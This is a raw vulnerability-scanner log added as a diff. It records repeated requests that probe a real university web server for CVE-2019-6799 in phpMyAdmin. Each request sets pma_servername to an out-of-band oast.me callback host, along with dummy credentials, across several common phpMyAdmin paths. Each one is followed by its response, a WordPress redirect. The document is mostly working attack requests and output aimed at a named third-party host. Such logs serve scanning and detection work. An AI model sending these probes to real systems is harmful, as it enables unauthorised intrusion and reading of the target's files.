@@ -1,0 +1,155 @@
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjg8o8gjmrh5ierp.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pmd/index.php?pma_servername=d29n3paus8n0ghhurvjg8o8gjmrh5ierp.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjg8o8gjmrh5ierp.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/pmd/?pma_servername=d29n3paus8n0ghhurvjg8o8gjmrh5ierp.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg8wf5y81mo5ck9.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg8wf5y81mo5ck9.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg8wf5y81mo5ck9.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/phpMyAdmin/?pma_servername=d29n3paus8n0ghhurvjg8wf5y81mo5ck9.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgqefu5ugwkte1t.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pma/index.php?pma_servername=d29n3paus8n0ghhurvjgqefu5ugwkte1t.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgqefu5ugwkte1t.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/pma/?pma_servername=d29n3paus8n0ghhurvjgqefu5ugwkte1t.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjgqnd9so6jg58ki.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /index.php?pma_servername=d29n3paus8n0ghhurvjgqnd9so6jg58ki.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjgqnd9so6jg58ki.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Location: https://camel.science.unimelb.edu.au/?pma_servername=d29n3paus8n0ghhurvjgqnd9so6jg58ki.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Pingback: https://camel.science.unimelb.edu.au/xmlrpc.php
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgqhtb3bspie1tf.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgqhtb3bspie1tf.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgqhtb3bspie1tf.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/_phpmyadmin/?pma_servername=d29n3paus8n0ghhurvjgqhtb3bspie1tf.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://camel.science.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgwepb84ezyinmr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgwepb84ezyinmr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: camel.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://camel.science.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjgwepb84ezyinmr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:28 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://camel.science.unimelb.edu.au/phpmyadmin/?pma_servername=d29n3paus8n0ghhurvjgwepb84ezyinmr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
